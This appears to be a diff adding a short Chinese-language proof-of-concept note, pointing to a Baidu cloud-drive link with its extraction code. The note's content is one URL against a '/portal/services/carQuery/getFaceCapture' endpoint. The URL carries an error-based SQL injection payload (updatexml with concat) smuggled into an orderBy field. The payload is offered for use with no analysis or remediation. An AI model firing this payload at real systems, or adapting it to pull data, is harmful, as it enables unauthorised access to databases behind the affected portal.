@@ -1,0 +1,7 @@
+该poc来自链接：https://pan.baidu.com/s/1wZoSo30EXiw9vMQBPtKFWg?pwd=zyxa 
+提取码：zyxa
+详情自行查看
+
+
+POC:
+/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1)--%22%7D/extend/%7B%7D
